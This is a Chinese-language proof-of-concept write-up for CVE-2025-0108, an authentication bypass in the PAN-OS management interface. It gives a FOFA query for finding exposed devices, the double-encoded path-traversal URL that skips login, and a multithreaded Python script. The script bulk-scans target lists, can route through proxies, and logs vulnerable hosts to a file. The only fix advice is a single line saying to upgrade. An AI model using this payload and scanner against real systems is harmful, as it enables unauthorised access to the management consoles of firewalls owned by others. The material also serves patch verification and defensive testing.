# 漏洞描述
Palo Alto Networks PAN-OS GlobalProtect 是Palo Alto Networks 的一款防火墙产品。2025年2日，互联网上披露 CVE-2025-0108 Palo Alto Networks PAN-OS Management 管理端权限绕过漏洞。攻击者可构造恶意请求绕过身份认证进入后台，执行恶意操作。

# 披露时间
2025-02-13

# fofa
"panos" && (icon_hash="-631559155" || icon_hash="873381299")

# 漏洞分析
[https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/](https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/)

# 漏洞复现
url后拼接`/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css`

![](https://cdn.nlark.com/yuque/0/2025/png/46595937/1739933782343-30009a6a-79c4-44db-897b-a4e3bdad5047.png)

# py脚本
```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib3
from urllib.parse import urljoin, quote

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
timeout = 15  # 请求超时时间

def verify(url,proxies):
    # if not url.startswith(('http://', 'https://')):
    #     # 如果没有，就添加 'http://'
    #     url = 'http://' + url
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        # 构造目标 URL
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        target_url = target_url.rstrip("/")  # 去除末尾的 "/"
        target_url1 = urljoin(target_url, "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css")

        print(f"Testing URL: {target_url1}")

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }
        try:
            r = requests.get(target_url1, headers=headers, verify=False, timeout=timeout, proxies=proxies)
            r1 = requests.get(target_url1, headers=headers, verify=False, timeout=timeout, proxies=proxies)
            if r.status_code == 200 and 'Zero Touch Provisioning' in r.text and 'Zero Touch Provisioning' in r1.text:
                print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                with open('CVE-2025-0108.txt', 'a') as f:
                    f.write(url + '\n')
            else:
                print("[-] No vulnerabilities found")

        except requests.exceptions.RequestException as e:
            print(e)

def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url:
                    yield url
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")

def main():
    # helpinfo = """ """
    # print(helpinfo)
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    parser.add_argument('-t', '--thread', type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies=proxies)
    elif args.file:
        urls = pl(args.file)
        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(lambda url: verify(url, proxies=proxies), urls)
    else:
        help()

if __name__ == '__main__':
    main()
```

# 修复建议
升级至最新版本

